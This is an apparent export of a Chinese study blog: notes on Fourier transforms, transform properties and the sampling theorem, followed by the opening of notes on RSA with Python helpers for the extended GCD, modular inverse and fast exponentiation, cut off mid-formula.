<p>傅里叶展开是对周期信号而言的，得到的频谱图也是离散的。</p>
<p>拓展到对非周期函数，则是令 <span class="math inline">\(T\to
\infty\)</span>，此时拟合成周期函数，有 <span class="math inline">\(\Delta \omega=\frac{2\pi}{T}\to
0\)</span>，频谱图从<strong>离散谱变为连续谱</strong>；同时<strong>谱线长度</strong>
<span class="math inline">\(F(n\omega)\to 0\)</span>。</p>
<p>此时连续谱与我们想要的频谱图是不一样的，我们称这种连续谱为<strong>频谱密度函数</strong>。</p>
<p>此时 <span class="math inline">\(F(n\omega) T\)</span>
趋近于有限值，为一个连续函数，通常记作 <span class="math inline">\(F(\omega)\)</span> 或 <span class="math inline">\(F(\j \omega)\)</span>，即 <span class="math display">\[
F(\omega)=\lim_{\omega \to 0} \frac{2\pi F(n\omega)}{\omega}=\lim_{T \to
\infty}F(n\omega)T
\]</span> 这样，在非周期信号下有 <span class="math display">\[
F(\omega)=\int^\infty_{-\infty}f(t)e^{-\j \omega t}\diff{t}
\]</span> 傅里叶级数为 <span class="math display">\[
f(t)=\frac{1}{2\pi}\int^{\infty}_{-\infty}F(\omega)e^{\j\omega
t}\diff{\omega}
\]</span>
把这种积分形式的傅里叶级数称为<strong>傅里叶变换</strong>，即<strong>非周期信号的连续频谱表达式</strong>。</p>
<blockquote>
<p>或者说把原函数从时域变换到频域（幅频坐标系）。</p>
</blockquote>
<p>记傅里叶正变换 <span class="math display">\[
F(\omega)=\mathscr{F}[f(t)]=\int^\infty_{-\infty}f(t)e^{-\j \omega
t}\diff{t}
\]</span> 记傅里叶逆变换 <span class="math display">\[
f(t)=\mathscr{F}^{-1}[F(\omega)]=\frac{1}{2\pi}\int^\infty_{-\infty}F(\omega)e^{\j
\omega t}\diff{t}
\]</span> 其中 <span class="math inline">\(F(\omega)\)</span> 是 <span class="math inline">\(f(t)\)</span> 的频谱函数，一般是复函数，可以写作
<span class="math display">\[
F(\omega)=|F(\omega)|e^{\j \varphi(\omega)}
\]</span> 其中 <span class="math inline">\(|F(\omega)|\)</span>
表示<strong>信号中各频率分量的相对大小</strong>，<span class="math inline">\(\varphi(\omega)\)</span>
表示<strong>信号中各频率分量之间的相位关系</strong>。</p>
<p>非周期函数的傅里叶级数也可以用 <span class="math inline">\(F(\omega)\)</span> 表示 <span class="math display">\[
f(t)=\frac{1}{2\pi}\int^\infty_{-\infty}|F(\omega)|\cos{[\omega
t}+\varphi(\omega)]\diff{\omega}
+
\frac{\j}{2\pi}\int^\infty_{-\infty}|F(\omega)|\sin{[\omega
t}+\varphi(\omega)]\diff{\omega}
\]</span> 当 <span class="math inline">\(f(t)\)</span>
为<strong>实函数</strong>时，化简为 <span class="math display">\[
f(t)=\frac{1}{\pi}\int^\infty_{0}|F(\omega)|\cos{[\omega
t}+\varphi(\omega)]\diff{\omega}
\]</span></p>
<h3 id="典型非周期信号的傅里叶变换">典型非周期信号的傅里叶变换</h3>
<h4 id="单边指数信号">单边指数信号</h4>
<p>即 <span class="math inline">\(f(t)=e^{-at},t\geq 0\)</span>，其中
<span class="math inline">\(a\)</span> 为正实数，有 <span class="math display">\[
F(\omega)=\frac{1}{a+\j \omega}\\
|F(\omega)|=\frac{1}{\sqrt{a^2+\omega^2}}\\
\varphi(\omega)=-\arctan{(\frac{\omega}{a})}
\]</span> <img src="/signal-and-system-note3/单边指数信号的波形及频谱.png" alt="单边指数信号的波形及频谱"></p>
<h4 id="双边指数信号">双边指数信号</h4>
<p>即 <span class="math inline">\(f(t)=e^{-a|t|}\)</span>，其中 <span class="math inline">\(a\)</span> 为正实数，有 <span class="math display">\[
F(\omega)=\frac{2a}{a^2+\omega^2}\\
|F(\omega)|=\frac{2a}{a^2+\omega^2}\\
\varphi(\omega)=0
\]</span> <img src="/signal-and-system-note3/双边指数信号的波形及频谱.png" alt="双边指数信号的波形及频谱"></p>
<h4 id="矩形脉冲信号">矩形脉冲信号</h4>
<p>即 <span class="math inline">\(f(t)=E[u(t+\frac{\tau}{2})-u(t-\frac{\tau}{2})]\)</span>，其中
<span class="math inline">\(E\)</span> 为脉冲幅度，<span class="math inline">\(\tau\)</span> 为脉冲宽度，有 <span class="math display">\[
F(\omega)=E\tau\cdot \mathop{\mathrm{Sa}}{(\frac{\omega\tau}{2})}\\
|F(\omega)|=E\tau|\mathop{\mathrm{Sa}}{(\frac{\omega\tau}{2})}|\\
\varphi(\omega)=0\text{ or }\pi
\]</span> <img src="/signal-and-system-note3/矩形脉冲信号的波形及频谱.png" alt="矩形脉冲信号的波形及频谱"></p>
<p>通常我们认为 <span class="math inline">\(\mathop{\mathrm{Sa}}(t)\)</span>
函数的主要信号分布在中心频段，故其占有频率范围（<strong>频带</strong>）
<span class="math display">\[
B\approx\frac{1}{\tau}
\]</span></p>
<h4 id="钟形脉冲信号">钟形脉冲信号</h4>
<p>即高斯脉冲，有 <span class="math display">\[
F(\omega)=\sqrt{\pi}E\tau\cdot \exp{[-(\frac{\omega \tau}{2})^2]}
\]</span> 它是一个正实函数，<strong>相位谱为零</strong>。</p>
<figure>
<img src="/signal-and-system-note3/钟形脉冲信号的波形和频谱.png" alt="钟形脉冲信号的波形和频谱">
<figcaption aria-hidden="true">钟形脉冲信号的波形和频谱</figcaption>
</figure>
<h4 id="符号函数">符号函数</h4>
<p><span class="math display">\[
f(t)=\mathrm{sgn}(t)=\begin{cases}
+1 &amp; t&gt;0\\
0 &amp; t=0\\
-1 &amp; t&lt;0
\end{cases}
\]</span></p>
<p>有 <span class="math display">\[
F(\omega)=\frac{2}{\j \omega}\\
|F(\omega)|=\frac{2}{|\omega|}\\
\varphi(\omega)=
\begin{cases}
-\frac{\pi}{2} &amp; \omega&gt;0\\
+\frac{\pi}{2} &amp; \omega&lt;0
\end{cases}
\]</span> <img src="/signal-and-system-note3/符号函数的波形和频谱.png" alt="符号函数的波形和频谱"></p>
<h4 id="升余弦脉冲信号">升余弦脉冲信号</h4>
<p><span class="math display">\[
f(t)=\frac{E}{2}[1+\cos{(\frac{\pi t}{\tau})}],0\leq |t|\leq \tau
\]</span></p>
<figure>
<img src="/signal-and-system-note3/升余弦脉冲信号的波形.png" alt="升余弦脉冲信号的波形">
<figcaption aria-hidden="true">升余弦脉冲信号的波形</figcaption>
</figure>
<p>有 <span class="math display">\[
F(\omega)=\frac{E\tau\cdot\mathop{\mathrm{Sa}}{(\omega\tau)}}{1-\left(\frac{\omega\tau}{\pi}\right)^2}
\]</span> <img src="/signal-and-system-note3/升余弦脉冲信号的频谱.png" alt="升余弦脉冲信号的频谱"></p>
<h3 id="奇异函数的傅里叶变换">奇异函数的傅里叶变换</h3>
<h4 id="冲激函数的傅里叶变换">冲激函数的傅里叶变换</h4>
<p>由冲激函数的抽样特性可知 <span class="math display">\[
F(\omega)=\mathscr{F}[\delta(t)]=1
\]</span> <img src="/signal-and-system-note3/单位冲激函数的频谱.png" alt="单位冲激函数的频谱"></p>
<p>这意味着，在时域中变化异常剧烈的冲激函数<strong>包含幅度相等的所有频率分量</strong>，因此这种频谱也被称为<strong>均匀谱</strong>或<strong>白色谱</strong>。</p>
<p>对其冲激函数逆变换，可以<strong>找到什么样的函数的频谱为冲激函数</strong>，得
<span class="math display">\[
f(t)=\mathscr{F}^{-1}[\delta(\omega)]=\frac{1}{2\pi}
\]</span>
结果表明，<strong>直流信号的傅里叶变换是冲激函数</strong>。</p>
<h4 id="冲激偶的傅里叶变换">冲激偶的傅里叶变换</h4>
<p>因为 <span class="math display">\[
\mathscr{F}[\delta(t)]=1
\]</span> 两边求导可得 <span class="math display">\[
\mathscr{F}[\delta&#39;(t)]=\j \omega
\]</span> 同理逆变换为 <span class="math display">\[
\mathscr{F}(t^n)=2\pi(\j)^n\delta^{(n)}(\omega)
\]</span></p>
<h4 id="阶跃函数的傅里叶变换">阶跃函数的傅里叶变换</h4>
<p>因为 <span class="math display">\[
u(t)=\frac{1}{2}+\frac{1}{2}\mathrm{sgn}(t)
\]</span> 故 <span class="math display">\[
\mathscr{F}[u(t)]=\mathscr{F}(\frac{1}{2})+\frac{1}{2}\mathscr{F}[\mathrm{sgn}(t)]
\]</span> 即 <span class="math display">\[
\mathscr{F}[u(t)]=\pi\delta(\omega)+\frac{1}{\j \omega}
\]</span> <img src="/signal-and-system-note3/单位阶跃函数的波形和频谱.png" alt="单位阶跃函数的波形和频谱"></p>
<h3 id="傅里叶变换的基本性质">傅里叶变换的基本性质</h3>
<h4 id="对称性">对称性</h4>
<p>若 <span class="math display">\[
F(\omega)=\mathscr{F}[f(t)]
\]</span> 则 <span class="math display">\[
\mathscr{F}[F(t)]=2\pi f(-\omega)
\]</span></p>
<blockquote>
<p>若 <span class="math inline">\(f(t)\)</span> 为偶函数则变为 <span class="math display">\[
\mathscr{F}[F(t)]=2\pi f(\omega)
\]</span> 即 <span class="math inline">\(f(t)\)</span> 的频谱为 <span class="math inline">\(F(\omega)\)</span>，那么形状为 <span class="math inline">\(F(t)\)</span> 的波形，其频谱必为 <span class="math inline">\(f(\omega)\)</span>。</p>
</blockquote>
<p>对 <span class="math inline">\(\mathop{\mathrm{Sa}}\)</span>
函数有</p>
<figure>
<img src="/signal-and-system-note3/时间函数与频谱函数的对称性举例.png" alt="时间函数与频谱函数的对称性举例">
<figcaption aria-hidden="true">时间函数与频谱函数的对称性举例</figcaption>
</figure>
<p>对单位阶跃信号有</p>
<figure>
<img src="/signal-and-system-note3/时间函数与频谱函数的对称性举例-16790621149231.png" alt="时间函数与频谱函数的对称性举例">
<figcaption aria-hidden="true">时间函数与频谱函数的对称性举例</figcaption>
</figure>
<h4 id="线性性叠加性">线性性（叠加性）</h4>
<p><span class="math display">\[
\mathscr{F}[\sum^\infty_{i=1} a_if_i(t)]=\sum^\infty_{i=1}
a_iF_i(\omega)
\]</span></p>
<blockquote>
<p>这对我们研究 LTI 系统十分有帮助。</p>
</blockquote>
<h4 id="奇偶虚实性">奇偶虚实性</h4>
<p>记 <span class="math display">\[
F(\omega)=|F(\omega)|e^{\j \varphi(\omega)}=R(\omega)+\j X(\omega)
\]</span> 其中 <span class="math inline">\(R(\omega)\)</span>
为实部，<span class="math inline">\(X(\omega)\)</span> 为虚部。</p>
<p><strong>当 <span class="math inline">\(f(t)\)</span>
为实函数时，<span class="math inline">\(R(\omega)\)</span>
为偶函数；<span class="math inline">\(X(\omega)\)</span>
为奇函数。</strong></p>
<p><strong>可证 <span class="math inline">\(|F(\omega)|\)</span>
是偶函数，<span class="math inline">\(\varphi(\omega)\)</span>
是奇函数。</strong></p>
<p>更进一步，</p>
<ul>
<li><p>当 <span class="math inline">\(f(t)\)</span> 为实偶函数，有 <span class="math display">\[
X(\omega)=0\\
F(\omega)=R(\omega)=2\int^\infty_0f(t)\cos{(\omega t)}\diff{t}
\]</span> 即 <span class="math inline">\(F(\omega)\)</span>
必为实偶函数。</p></li>
<li><p>当 <span class="math inline">\(f(t)\)</span> 为实奇函数，有 <span class="math display">\[
R(\omega)=0\\
F(\omega)=\j X(\omega)=-2\j\int^\infty_0f(t)\sin{(\omega t)}\diff{t}
\]</span> 即 <span class="math inline">\(F(\omega)\)</span>
必为虚奇函数。</p></li>
</ul>
<p><strong>当 <span class="math inline">\(f(t)\)</span>
为虚函数时，<span class="math inline">\(R(\omega)\)</span>
为奇函数；<span class="math inline">\(X(\omega)\)</span>
为偶函数。</strong></p>
<p>同时满足 <span class="math display">\[
\mathscr{F}[f(-t)]=F(-\omega)
\]</span> 对于复共轭函数 <span class="math inline">\(f^*(t)\)</span>
同理 <span class="math display">\[
\mathscr{F}[f^*(t)]=F^*(-\omega)\\
\mathscr{F}[f^*(-t)]=F^*(\omega)
\]</span></p>
<h4 id="尺度变换特性">尺度变换特性</h4>
<p><span class="math display">\[
\mathscr{F}[f(at)]=\frac{1}{|a|}F(\frac{\omega}{a})
\]</span></p>
<p>即时域缩减 <span class="math inline">\(a\)</span> 倍，那么频域将扩大
<span class="math inline">\(a\)</span> 倍，幅值缩小 <span class="math inline">\(|a|\)</span> 倍。</p>
<p>即<strong>信号在时域中压缩等效于在频域中扩展，反之亦然。</strong></p>
<blockquote>
<p>当 <span class="math inline">\(a=-1\)</span> 时，<span class="math inline">\(\mathscr{F}[f(-t)]=F(-\omega)\)</span>，这表明<strong>信号在时域中反褶等效于在频域中反褶</strong>。</p>
</blockquote>
<p>通过这点可以得出，<strong>信号的等效脉冲宽度与占有的等效带宽成反比</strong>。如果要压缩信号的持续时间，就不得不以展宽频带作代价，所以在通信系统中，<strong>通信速度和占用频带宽度是矛盾的</strong>。</p>
<h4 id="时移特性">时移特性</h4>
<p><span class="math display">\[
\mathscr{F}[f(t-t_0)]=F(\omega)e^{-\j \omega t_0}
\]</span></p>
<p>信号右移（滞后）<span class="math inline">\(t_0\)</span>
等效于在频域中乘以因子 <span class="math inline">\(e^{-\j \omega
t_0}\)</span>，即相位谱产生附加变化 <span class="math inline">\(-\omega
t_0\)</span>。</p>
<p>如果时移加尺度变换，则有 <span class="math display">\[
\mathscr{F}[f(at+t_0)]=\frac{1}{|a|}F(\frac{\omega}{a})e^{\j \omega
\frac{t_0}{a}}
\]</span></p>
<h4 id="频移特性">频移特性</h4>
<p><span class="math display">\[
\mathscr{F}[f(t)e^{\j \omega_0 t}]=F(\omega -\omega_0)
\]</span></p>
<p><strong>频谱搬移技术</strong>在通信系统中得到广泛应用，诸如调幅、同步解调、变频等。</p>
<p>例如 <span class="math display">\[
\mathscr{F}[f(t)\cos{(\omega_0
t)}]=\frac{1}{2}[F(\omega+\omega_0)+F(\omega-\omega_0)]\\
\mathscr{F}[f(t)\sin{(\omega_0
t)}]=\frac{\j}{2}[F(\omega+\omega_0)-F(\omega-\omega_0)]
\]</span></p>
<h4 id="微分特性">微分特性</h4>
<p>时域微分特性 <span class="math display">\[
\mathscr{F}\left[\frac{\diff}{\diff{t}}f(t)\right]=\j \omega F(\omega)\\
\mathscr{F}\left[\frac{\diff^n}{\diff{t^n}}f(t)\right]=(\j \omega)^n
F(\omega)
\]</span> 频域微分特性 <span class="math display">\[
\mathscr{F}^{-1}\left[\frac{\diff}{\diff{t}}F(\omega)\right]=(-\j
t)f(t)\\
\mathscr{F}^{-1}\left[\frac{\diff^n}{\diff{t^n}}F(\omega)\right]=(-\j
t)^n f(t)
\]</span> 应用在于，我们知道 <span class="math display">\[
\mathscr{F}[u(t)]=\frac{1}{\j \omega}+\pi \delta(\omega)
\]</span> 那么应用微分特性可以知道 <span class="math display">\[
\mathscr{F}[\delta(t)]=\j\omega[\frac{1}{\j \omega}+\pi
\delta(\omega)]=1\\
\mathscr{F}[\delta&#39;(t)]=\j \omega
\]</span></p>
<h4 id="积分特性">积分特性</h4>
<p>时域积分特性 <span class="math display">\[
\mathscr{F}[\int^t_{-\infty}f(\tau)\diff{\tau}]=\frac{F(\omega)}{\j
\omega}+\pi F(0)\delta(\omega)
\]</span> 频域积分特性 <span class="math display">\[
\mathscr{F}^{-1}[\int^\omega_{-\infty}f(\Omega)\diff{\Omega}]=-\frac{f(t)}{\j
t}+\pi f(0)\delta(t)
\]</span></p>
<h3 id="卷积特性卷积定理">卷积特性（卷积定理）</h3>
<p>卷积定理揭示了时域与频域的运算关系，在通信系统和信号处理研究领域中得到大量应用。</p>
<h4 id="时域卷积定理">时域卷积定理</h4>
<p><span class="math display">\[
\mathscr{F}[f_1(t)*f_2(t)]=F_1(\omega)F_2(\omega)
\]</span></p>
<p><strong>时域卷积对应频域频谱密度函数乘积。</strong></p>
<h4 id="频域卷积定理">频域卷积定理</h4>
<p><span class="math display">\[
\mathscr{F}[f_1(t)\cdot f_2(t)]=\frac{1}{2\pi}F_1(\omega)*F_2(\omega)
\]</span></p>
<p><strong>频域卷积对应时域函数乘积的 <span class="math inline">\(2\pi\)</span> 倍。</strong></p>
<h3 id="周期信号的傅里叶变换">周期信号的傅里叶变换</h3>
<h4 id="指数信号">指数信号</h4>
<p><span class="math display">\[
\mathscr{F}[e^{\j \omega_0 t}]=2\pi\delta(\omega -\omega_0)
\]</span></p>
<h4 id="正弦余弦信号">正弦、余弦信号</h4>
<p><span class="math display">\[
\mathscr{F}[\cos{(\omega_0
t)}]=\pi[\delta(\omega+\omega_0)+\delta(\omega-\omega_0)]\\
\mathscr{F}[\sin{(\omega_0
t)}]=\j\pi[\delta(\omega+\omega_0)-\delta(\omega-\omega_0)]
\]</span></p>
<figure>
<img src="/signal-and-system-note3/余弦和正弦信号的频谱.png" alt="余弦和正弦信号的频谱">
<figcaption aria-hidden="true">余弦和正弦信号的频谱</figcaption>
</figure>
<h4 id="一般周期信号">一般周期信号</h4>
<p>设周期函数 <span class="math inline">\(f(t)\)</span> 满足 <span class="math display">\[
f(t)=f(t+T)\\
\omega_0=\frac{2\pi}{T}
\]</span> 指数形式的傅里叶展开为 <span class="math display">\[
\newcommand{\j}{\mathrm{j}}
f(t)=\sum^{\infty}_{-\infty}F_ne^{\j n\omega_0 t}\\
\]</span> 傅里叶变换为 <span class="math display">\[
\begin{align}
\mathscr{F}[f(t)]
&amp;=\sum^{\infty}_{-\infty}F_n\mathscr{F}[e^{\j n\omega_0 t}]\\
&amp;=\sum^{\infty}_{-\infty}F_n[2\pi\delta(\omega-n\omega_0)]\\
&amp;=2\pi\sum^{\infty}_{-\infty}F_n\delta(\omega-n\omega_0)
\end{align}
\]</span> 可以知道，周期信号 <span class="math inline">\(f(t)\)</span>
的傅里叶变换是<strong>由一些冲激函数组成的</strong>，这些冲激位处于信号的<strong>谐频</strong>。</p>
<blockquote>
<p>从中我们也可以知道，当 <span class="math inline">\(T\to
\infty\)</span>，即 <span class="math inline">\(\omega\to 0\)</span>
时，频谱图中频率间隔趋近于零，此时傅里叶变换得到的频谱图将变为密度很高的冲激函数的组合，密度足够小时，即为连续图像。</p>
<p>同时反之也可以知道，周期信号的傅里叶变换，我们可以先选取周期信号的一个周期进行傅里叶变换，然后再间隔
<span class="math inline">\(\omega_0\)</span>
抽样，这样也得到了周期信号的傅里叶变换。</p>
</blockquote>
<p>例如周期为 <span class="math inline">\(T_1\)</span>，脉宽为 <span class="math inline">\(\tau\)</span>
的矩形脉冲信号，我们首先知道单周期的矩形脉冲信号的傅里叶变换为 <span class="math display">\[
F(\omega)=E\tau\cdot \mathop{\mathrm{Sa}}{(\frac{\omega\pi}{2})}
\]</span> <img src="/signal-and-system-note3/矩形脉冲信号的波形及频谱.png" alt="矩形脉冲信号的波形及频谱"></p>
<p>我们间隔 <span class="math inline">\(\omega_0=\frac{2\pi}{T_1}\)</span>
进行抽样冲激函数，得到结果</p>
<figure>
<img src="/signal-and-system-note3/周期矩形脉冲信号的傅里叶变换.png" alt="周期矩形脉冲信号的傅里叶变换">
<figcaption aria-hidden="true">周期矩形脉冲信号的傅里叶变换</figcaption>
</figure>
<blockquote>
<p>需要注意乘以 <span class="math inline">\(2\pi\)</span>。</p>
</blockquote>
<h3 id="抽样信号的傅里叶变换">抽样信号的傅里叶变换</h3>
<p><strong>连续信号乘以抽样脉冲得到抽样信号。</strong></p>
<figure>
<img src="/signal-and-system-note3/抽样过程.png" alt="抽样过程">
<figcaption aria-hidden="true">抽样过程</figcaption>
</figure>
<h4 id="时域抽样">时域抽样</h4>
<p>我们知道，时域乘与频域卷积是等效的，那么 <span class="math display">\[
\mathscr{F}[f(t)\cdot p(t)]=2\pi F(t)*P(t)
\]</span></p>
<h5 id="矩形脉冲抽样">矩形脉冲抽样</h5>
<figure>
<img src="/signal-and-system-note3/矩形抽样信号的频谱.png" alt="矩形抽样信号的频谱">
<figcaption aria-hidden="true">矩形抽样信号的频谱</figcaption>
</figure>
<h5 id="冲激脉冲抽样">冲激脉冲抽样</h5>
<figure>
<img src="/signal-and-system-note3/冲击抽样信号的频谱.png" alt="冲击抽样信号的频谱">
<figcaption aria-hidden="true">冲击抽样信号的频谱</figcaption>
</figure>
<p>可以发现，<strong>时域抽样会使得频域信号产生周期</strong>。</p>
<h4 id="频域抽样">频域抽样</h4>
<p>我们在周期信号的傅里叶变换中可以知道，频域冲激抽样相当于让时域信号产生周期。</p>
<figure>
<img src="/signal-and-system-note3/频谱抽样所对应的信号波形.png" alt="频谱抽样所对应的信号波形">
<figcaption aria-hidden="true">频谱抽样所对应的信号波形</figcaption>
</figure>
<p>可以发现，<strong>频域抽样会使得时域信号产生周期</strong>。</p>
<h4 id="特性">特性</h4>
<figure>
<img src="/signal-and-system-note3/周期信号和抽样信号的特性.png" alt="周期信号和抽样信号的特性">
<figcaption aria-hidden="true">周期信号和抽样信号的特性</figcaption>
</figure>
<p>时域和频域之间，抽样其中一边的信号，会使得另一边的信号产生重复（周期）。</p>
<h3 id="抽样定理">抽样定理</h3>
<h4 id="时域抽样定理">时域抽样定理</h4>
<p>我们知道，在时域抽样会使得频域信号产生周期，也就是说实际上我们可以抽取频域信号的一个周期来还原时域信号，这就是现代数字通信的原理之一。</p>
<p>但是，我们会发现，如果说 <span class="math inline">\(\omega\)</span>
越小，也就是说 <span class="math inline">\(T\)</span>
越大，那么频域信号重复得就会越快。</p>
<p>我们把 <span class="math inline">\(f=\frac{1}{T}=\frac{\omega}{2\pi}\)</span>
称作<strong>抽样频率</strong>（抽样率）。</p>
<p>抽样率越低，抽样的冲激信号越分散，频域信号重复得越快；</p>
<p>抽样率越高，抽样的冲激信号越密集，频域信号重复得越慢。</p>
<blockquote>
<p>从这一点也可以得知，当抽样率趋近于零的时候，相当于周期信号的每个部分重叠在一个位置，这也是符合非周期信号的傅里叶变换的现象。</p>
</blockquote>
<figure>
<img src="/signal-and-system-note3/低抽样率时的抽样信号及频谱（混叠）.png" alt="低抽样率时的抽样信号及频谱（混叠）">
<figcaption aria-hidden="true">低抽样率时的抽样信号及频谱（混叠）</figcaption>
</figure>
<p>我们可以从图中看出，如果说频域信号产生了重叠（<strong>混叠</strong>），那么我们就无法从单一周期内的频域信号还原出完整的时域信号。</p>
<p><strong>抽样定理</strong>指出：</p>
<blockquote>
<p>一个频谱受限的信号 <span class="math inline">\(f(t)\)</span>，如果频谱只占据 <span class="math inline">\(-\omega_m\sim+\omega_m\)</span> 的范围，则信号
<span class="math inline">\(f(t)\)</span>
可以用等间隔的抽样值惟一的表示。而抽样间隔必须不大于 <span class="math inline">\(\frac{1}{2f_m}\)</span>，其中 <span class="math inline">\(\omega_m=2\pi
f_m\)</span>，或者说，<strong>最低抽样频率</strong>为 <span class="math inline">\(2f_m\)</span>。</p>
</blockquote>
<p>即<strong>重建原信号的必要条件为
抽样率需要大于等于最低抽样率</strong>： <span class="math display">\[
f\geq 2f_m\text{ or }\omega\geq 2\omega_m
\]</span>
其中最大抽样间隔称为<strong>奈奎斯特抽样间隔</strong>，最低抽样频率称为<strong>奈奎斯特抽样频率</strong>。</p>
<p>抽样定理的物理意义为</p>
<ul>
<li>对于一个<strong>频率受限</strong>的信号波形决不可能在很短的时间内产生独立的、实质的变化，它的<strong>最高变化速度</strong>受<strong>最高频率分量</strong>
<span class="math inline">\(\omega_m\)</span> 的限制。</li>
<li>为保留波形所有频率分量的全部信息，<strong>要求一个周期的间隔内至少抽样两次</strong>。</li>
</ul>
<p>根据抽样定理，如果想要恢复原信号，我们需要选取频域的一个周期，一般采取
<span class="math display">\[
F(\omega)=F_s(\omega)H(\omega)
\]</span> 其中 <span class="math inline">\(F_s(\omega)\)</span>
是抽样信号傅里叶变换后的时域信号，<span class="math inline">\(H(\omega)\)</span> 是矩形信号 <span class="math display">\[
H(\omega)=\begin{cases}
T &amp; |\omega|&lt;\omega_m\\
0 &amp; |\omega|&gt;\omega_m
\end{cases}
\]</span> 即选取低频信号，一般是将抽样信号 <span class="math inline">\(f_s(t)\)</span>
施加于<strong>理想低通滤波器</strong>（该滤波器的传输函数为 <span class="math inline">\(H(\omega)\)</span>），这样就得到了频谱为 <span class="math inline">\(F(\omega)\)</span> 的连续信号 <span class="math inline">\(f(t)\)</span>。</p>
<h4 id="频域抽样定理">频域抽样定理</h4>
<p>由时域和频域的对称性，可以得到频域抽样定理：</p>
<blockquote>
<p>若信号 <span class="math inline">\(f(t)\)</span>
是时间受限信号，它集中在 <span class="math inline">\(-t_m\sim+t_m\)</span>
的时间范围内，若在频域中以不大于 <span class="math inline">\(\frac{1}{2t_m}\)</span> 的频率间隔对 <span class="math inline">\(f(t)\)</span> 的频谱 <span class="math inline">\(F(\omega)\)</span> 进行抽样，则抽样后的频谱 <span class="math inline">\(F_s(\omega)\)</span> 可以惟一地表示原信号。</p>
</blockquote>
]]></content>
      <tags>
        <tag>信号与系统</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA 笔记</title>
    <url>//rsa-note.html</url>
    <content><![CDATA[<h1 id="rsa-算法描述">RSA 算法描述</h1>
<ol type="1">
<li><p>任意选取两个不同的大素数<span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>计算乘积<span class="math inline">\(n=pq\)</span>，使用欧拉函数得到<span class="math inline">\(\varphi (n)=(p-1)(q-1)\)</span></p></li>
<li><p>任意选取一个大整数<span class="math inline">\(e\)</span>，满足<span class="math inline">\(gcd(e,
\varphi (n))=1\)</span>，整数<span class="math inline">\(e\)</span>用作加密密钥</p></li>
<li><p>确定的解密密钥<span class="math inline">\(d\)</span>，满足<span class="math inline">\((de)\ mod\ \varphi (n)=1\)</span>，即<span class="math inline">\(de=k\varphi (n)+1\)</span>，<span class="math inline">\(k\geq1\)</span>是一个任意的整数 (求逆元)</p></li>
<li><p>公开整数<span class="math inline">\(n\)</span>和<span class="math inline">\(e\)</span>，秘密保存<span class="math inline">\(d\)</span></p></li>
<li><p>将明文<span class="math inline">\(m\)</span>加密成密文<span class="math inline">\(c\)</span>，加密算法为： <span class="math display">\[
c=E(m)=m^e\ mod\ n
\]</span></p></li>
<li><p>将密文<span class="math inline">\(c\)</span>解密为明文<span class="math inline">\(m\)</span>，解密算法为： <span class="math display">\[
m=D(c)=c^d\ mod\ n
\]</span></p></li>
</ol>
<h1 id="rsa-必要算法">RSA 必要算法</h1>
<h2 id="拓展欧几里得算法">拓展欧几里得算法</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extendedGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="comment"># a*xi + b*yi = ri</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = extendedGCD(b, a % b)</span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以使用 <code>gmpy2.gcdext(a, b)</code> 替代，返回三元元组 <span class="math inline">\((g,s,t)\)</span></p>
<p>其中<span class="math inline">\(g=\gcd(a, b)=sa+tb\)</span></p>
</blockquote>
<p>存在相关性的定理：裴蜀定理。</p>
<p>裴蜀定理说明了对任意整数 <span class="math inline">\(a,b\)</span>
和它们的最大公约数 <span class="math inline">\(\gcd{(a,b)}=d\)</span>，那么对任意整数 <span class="math inline">\(x,y\)</span> 都有 <span class="math inline">\(ax+by\)</span> 为 <span class="math inline">\(d\)</span> 的倍数，即 <span class="math display">\[
ax+by=0\pmod{d}
\]</span> 特别地，一定存在整数使得 <span class="math inline">\(ax+by=d\)</span> 成立。</p>
<p>一个重要推论为，<span class="math inline">\(a,b\)</span>
互质的充分必要条件为存在整数 <span class="math inline">\(x,y\)</span>
使得 <span class="math inline">\(ax+by=1\)</span>。</p>
<h2 id="求逆元">求逆元</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invert</span>(<span class="params">e, phi</span>):</span><br><span class="line">    (x, y, r) = extendedGCD(e, phi)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> phi + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以使用 <code>gmpy2.invert(e, phi)</code> 替代</p>
</blockquote>
<h2 id="快速幂">快速幂</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fastExpMod</span>(<span class="params">b,e,c</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e &amp; <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            result = (result * b) % c</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b = (b * b) % c</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以直接使用 python 自带的 <code>pow(b, e, c)</code></p>
</blockquote>
<h2 id="数论模运算">数论模运算</h2>
<h3 id="除法">除法</h3>
<p><span class="math display">\[
c=m\times a\ mod\ n\\
\]</span></p>
<p>对于上式，已知<span class="math inline">\(c,a,n\)</span>求<span class="math inline">\(m\)</span>，不能直接求<span class="math inline">\(c\div a\)</span>，需要将其转换为 <span class="math display">\[
m=c\times invert(a,n)\ mod\ n
\]</span> 即<span class="math inline">\(c\)</span>乘以<span class="math inline">\(a\)</span>对<span class="math inline">\(n\)</span>的逆元</p>
<h3 id="负数次幂">负数次幂</h3>
<p>若要求 <span class="math display">\[
k=c^s\ mod\ n
\]</span> 其中<span class="math inline">\(s&lt;0\)</span>，则需要将其转换为 <span class="math display">\[
k=invert(c, n)^{-s}
